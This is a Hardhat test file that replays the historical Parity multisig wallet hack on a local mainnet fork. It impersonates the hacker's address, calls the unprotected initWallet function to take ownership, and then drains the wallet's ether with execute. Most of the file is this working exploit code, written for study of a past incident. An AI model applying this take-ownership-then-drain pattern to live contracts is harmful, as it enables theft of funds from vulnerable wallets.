// https://cmichel.io/replaying-ethereum-hacks-introduction/

// @ts-nocheck
import { expect } from "chai";
import { ethers } from "hardhat";

// used for impersonation  (2sn alternative)
const helpers = require("@nomicfoundation/hardhat-network-helpers");

const walletAddress = "0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e";
const hackerAddress = "0xB3764761E297D6f121e79C32A65829Cd1dDb4D32";


import { request_fork } from "../utils";

// https://docs.ethers.io/v5/api/contract/example/
const abi = [
    "function initWallet(address[] _owners, uint _required, uint _daylimit)",
    "function execute(address _to, uint _value, bytes _data) external"
]
const blockNumber = 4043801;

describe("Parity Hack", () => {
    let hacker: any;
    let wallet: any;

    

    // before(async () => {
    // });

    beforeEach(async () => {
        // impersonating the hacker's account.
        // await hre.network.provider.request({
        //     method: "hardhat_impersonateAccount",
        //     params: [ hackerAddress ],
        // });
        // hacker = await ethers.getSigner(hackerAddress);
        // wallet = new ethers.Contract(walletAddress, abi, hacker);

        // https://github.com/NomicFoundation/hardhat/issues/1226

        // https://hardhat.org/hardhat-network/docs/guides/forking-other-networks#impersonating-accounts

        // 1st alternative
        // --------------------------------------------------
        // const provider = new ethers.providers.JsonRpcProvider(
        //     "http://0.0.0.0:8545"
        //   );
        // await provider.send("hardhat_impersonateAccount", [ hackerAddress ]);
        // hacker = await provider.getSigner(hackerAddress);
        // wallet = new ethers.Contract(walletAddress, abi, hacker);

        // 2nd alternative
        // --------------------------------------------------
        // await helpers.impersonateAccount(hackerAddress);
        // hacker = await ethers.getSigner(hackerAddress);
        // wallet = new ethers.Contract(walletAddress, abi, hacker);
        
        request_fork(blockNumber, [hackerAddress])

        // 3rd alternative
        // --------------------------------------------------
        hacker = await ethers.getImpersonatedSigner(hackerAddress);
        // await hacker.sendTransaction(...);
        wallet = new ethers.Contract(walletAddress, abi, hacker);

    });

    it(`should be block number: ${blockNumber}`, async () => {
        const _blockNumber = await ethers.provider.getBlockNumber();
        expect(_blockNumber).to.equal(blockNumber);
    });

    it("should steal funds and update balances", async () => {
        request_fork(blockNumber, [hackerAddress])

        const walletBalancePrior = await ethers.provider.getBalance(walletAddress);
        const hackerBalancePrior = await ethers.provider.getBalance(hackerAddress);
        
        // we call the unprotected initWallet method.
        console.log("\nWe call the unprotected initWallet method ...\n");

        await wallet.connect(hacker).initWallet([hackerAddress], 1, 0);
        console.log(`  wallet balance prior to the hack --> ${ethers.utils.formatEther(walletBalancePrior)} Eth`);
        console.log(`  hacker balance prior to the hack --> ${ethers.utils.formatEther(hackerBalancePrior)} Eth`);
        expect(Math.trunc(Number(walletBalancePrior))).to.be.greaterThan(0);

        request_fork(blockNumber, [hackerAddress])
        
        // stealing all the funds, sending them to hackerAddress.
        console.log("\nStealing all the funds, sending them to hackerAddress ...\n")

        await wallet.connect(hacker).execute(hackerAddress, walletBalancePrior, "0x");
        const hackerBalancePost = await ethers.provider.getBalance(hackerAddress);
        const walletBalancePost = await ethers.provider.getBalance(walletAddress);
        console.log(`  wallet balance after the hack --> ${ethers.utils.formatEther(walletBalancePost)} Eth`);
        console.log(`  hacker balance after the hack --> ${ethers.utils.formatEther(hackerBalancePost)}`);
        const hackedAmount = hackerBalancePost.sub(hackerBalancePrior);
        console.log(`\nSuccesfully hacked --> ${ethers.utils.formatEther(hackedAmount)}Eth`);
        
        // wallet should have 0 ether.
        expect(walletBalancePost).to.equal(0);
        
        // Hacker should have more Eth than before this execution.
        expect(Math.trunc(Number(hackerBalancePost))).to.be.greaterThan(Math.trunc(Number(hackerBalancePrior)));
    });
});